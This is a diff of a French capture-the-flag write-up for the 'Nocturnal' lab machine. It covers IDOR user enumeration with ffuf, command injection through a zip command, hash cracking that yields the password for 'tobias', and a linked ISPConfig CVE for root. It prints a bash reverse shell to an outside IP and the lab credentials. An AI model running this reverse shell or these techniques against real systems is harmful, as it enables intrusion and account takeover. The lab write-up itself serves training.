@@ -22,16 +22,19 @@ seasonal: no
 
 # Summary
 ## Foothold
-- Idor nous permet de lire les fichiers des autres
-- On trouve par un fuzzing l'utilisateur `amanda`
-- Le fichier stocké par `amanda` nous donne un mot de passe pour son compte
-- On utilise la page admin pour lire `admin.php`
-- En échappant le contexte de la commande `zip` on obtient un shell
+- Idor nous permet de lire les fichiers des autres.
+- Une attaque par dictionnaire (fuzzing) montre l'utilisateur `amanda`.
+- Le fichier stocké par `amanda` révèle un mot de passe pour son compte.
+- La page admin permet d'afficher le contenu de `admin.php`.
+- En échappant le contexte de la commande `zip` on obtient un shell.
 ## PrivEsc
-- Une bdd nous donne l'utilisateur `tobias`
-- Le service `ispconfig` tourne sur le port `8080`, on le forward
-- On se connecte à `admin` avec le mdp de tobias
-- Une CVE nous donne notre root shell.
+- La bdd contient les infos de l'utilisateur `tobias`, dont son mot de passe.
+- Le service `ispconfig` tourne sur le port `8080`, il est possible d'y accéder grâce à un forward ssh.
+- Le compte `admin` peut être accédé avec le mdp de tobias
+- [Une CVE](https://github.com/ajdumanhug/CVE-2023-46818) donne root shell.
+## Trouver les solutions
+- Puisqu'il faut donner à César ce qui revient à Ognon (et un peu à loutre aussi), je tiens à remercier Ognon (et un peu loutre aussi) pour son aide à travers cette box et sa patience pour m'aider à débugger mes petits soucis de vpn.
+
 
 
 # Foothold
@@ -46,20 +49,19 @@ On voit les ports `22` et `80`. Sur le site web on trouve plusieurs pages intér
 - `uploads_user`
 - `uploads2`
 
-Le site en lui-même ne nous indique rien.
+Le site en lui-même n'indique rien.
 ![[Pasted image 20260410143807.png]]
 
-On s'inscrit sur `register.php` et on obtient notre accès, après quoi on peut upload des fichiers.
+La page `register.php` permet de s'inscrire et obtenir un accès, après quoi on peut charger des des fichiers via upload.
 ![[Pasted image 20260410143903.png]]
 
-On upload un fichier et on obtient ainsi un lien pour télécharger notre fichier:
+Après avoir upload un fichier le site répond avec un lien pour télécharger le fichier.
 ```
 http://nocturnal.htb/view.php?username=guest&file=oogway.pdf
 ```
 
-On va tester d'upload en utilisant le nom d'un autre utilisateur, `admin` par exemple (on se foute qu'il existe puisqu'on a pas pu créer d'utilisateur admin).
 
-On voit assez vite qu'une idor est possible, on change le nom pour `leet` on voit que l'utilisateur n'existe pas mais `admin` existe mais ne retourne rien. On fuzz donc les utilisateurs avec la seclist `Usernames/Names/names.txt` et on obtient qu'un autre utilisateur, `amanda`, existe.
+On voit assez vite qu'une idor est possible en changeant le nom pour `leet` l'utilisateur n'existe pas mais `admin` existe, il ne montre en revanche aucun fichier stocké. En effectuant une attaque par dictionnaire (fuzzing), il est possible de trouver un autre utilisateur qui existe et possède des fichiers sur la machine, pour cela la seclist `Usernames/Names/names.txt` est très utile. On obtient bien un autre utilisateur, `amanda`.
 
 ```
 ffuf -u "http://nocturnal.htb/view.php?username=FUZZ&file=.pdf" -H 'Cookie: PHPSESSID=n0spgp65idb08uk27jh1vkjr4a' -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -fs 2985
@@ -67,7 +69,7 @@ ffuf -u "http://nocturnal.htb/view.php?username=FUZZ&file=.pdf" -H 'Cookie: PHPS
 
 ![[Pasted image 20260410164924.png]]
 
-On se rend sur sa page et bingo, on obtient un fichier intéressant.
+En se rendant sur sa page on est accueillis en effet avec un fichier intéressant.
 
 ![[Pasted image 20260410165001.png]]
 
@@ -110,6 +112,8 @@ function cleanEntry($entry) {
 }
 ```
 
+(je tiens à préciser que c'est à cette partie qu'Ognon le grand m'a aidé, je lui dois d'avoir continué)
+
 On va tirer avantage du parsing et break out de la commande pour exécuter ce que l'on souhaite. On créé d'abord un fichier `shell`.
 ```
 /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.23/4444 0>&1'
@@ -138,12 +142,12 @@ f38cde1654b39fea2bd4f72f1ae4cdda
 EOF
 ```
 
-Et on crack ce fichier avec hashcat (sha1). On finit par en trouver un que l'on crack
+Et on craque ce fichier avec hashcat (md5, mode 0). On finit par en trouver un que l'on craque
 ```
 55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
 ```
 
-C'est celui de tobias, on a donc des creds en plus: `tobias:slowmotionapocalypse`
+C'est celui de tobias, on a donc des identifiants en plus: `tobias:slowmotionapocalypse`
 
 Et voilà, notre accès ssh.
 ![[Pasted image 20260411142300.png]]
@@ -151,6 +155,8 @@ Et voilà, notre accès ssh.
 On n'oublie pas le flag user bien sûr.
 
 # PrivEsc to root
+
+(Ognon ne m'a pas donné la réponse mais il m'a donné quelques conseils sur les pratiques à suivre, avec loutre, merci à eux)
 
 On remarque un process qui tourne sur le port `8080`. On le forward en localhost pour pouvoir y accéder:
 ```
